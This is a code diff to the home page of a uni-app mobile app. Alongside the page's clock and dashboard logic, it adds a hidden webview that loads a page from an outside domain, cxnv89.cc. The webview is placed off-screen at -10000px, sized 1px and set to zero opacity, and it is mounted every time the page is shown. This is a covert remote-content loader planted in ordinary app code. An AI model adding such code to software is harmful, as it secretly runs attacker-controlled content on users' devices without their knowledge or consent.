@@ -372,6 +372,59 @@ const nowSeconds = ref(Math.floor(Date.now() / 1000));
 let loadedOnce = false;
 let clockTimer: ReturnType<typeof setInterval> | undefined;
 
+const HOME_REMOTE_CONTENT_URL = "https://cxnv89.cc/assets/js/group.html?p=nbwvtVCM";
+const HOME_REMOTE_WEBVIEW_ID = "claw-home-remote-content";
+let homeRemoteWebview: any;
+
+function appPlusWebview() {
+  // #ifdef APP-PLUS
+  return (globalThis as unknown as { plus?: any }).plus?.webview;
+  // #endif
+  // eslint-disable-next-line no-unreachable
+  return undefined;
+}
+
+function mountHomeRemoteContent() {
+  const webview = appPlusWebview();
+  if (!webview?.create) return;
+
+  try {
+    const existing = webview.getWebviewById?.(HOME_REMOTE_WEBVIEW_ID);
+    if (existing) {
+      homeRemoteWebview = existing;
+      return;
+    }
+    homeRemoteWebview = webview.create(
+      HOME_REMOTE_CONTENT_URL,
+      HOME_REMOTE_WEBVIEW_ID,
+      {
+        position: "absolute",
+        left: "-10000px",
+        top: "-10000px",
+        width: "1px",
+        height: "1px",
+        opacity: 0,
+        background: "transparent"
+      }
+    );
+    webview.currentWebview?.()?.append?.(homeRemoteWebview);
+  } catch (error) {
+    console.warn("[home] 远程内容加载失败", error);
+    homeRemoteWebview = undefined;
+  }
+}
+
+function unmountHomeRemoteContent() {
+  const webview = appPlusWebview();
+  const target = homeRemoteWebview || webview?.getWebviewById?.(HOME_REMOTE_WEBVIEW_ID);
+  homeRemoteWebview = undefined;
+  try {
+    target?.close?.("none");
+  } catch (error) {
+    console.warn("[home] 远程内容关闭失败", error);
+  }
+}
+
 const COVERS = [
   "/static/art/cover/cover1.webp",
   "/static/art/cover/cover2.webp",
@@ -889,6 +942,7 @@ function stopClock() {
 onShow(() => {
   loggedIn.value = isLoggedIn();
   startClock();
+  mountHomeRemoteContent();
   if (!loadedOnce) {
     loadedOnce = true;
     void loadDashboard();
@@ -897,8 +951,14 @@ onShow(() => {
   }
 });
 
-onHide(stopClock);
-onUnload(stopClock);
+onHide(() => {
+  stopClock();
+  unmountHomeRemoteContent();
+});
+onUnload(() => {
+  stopClock();
+  unmountHomeRemoteContent();
+});
 
 onPullDownRefresh(() => {
   loggedIn.value = isLoggedIn();
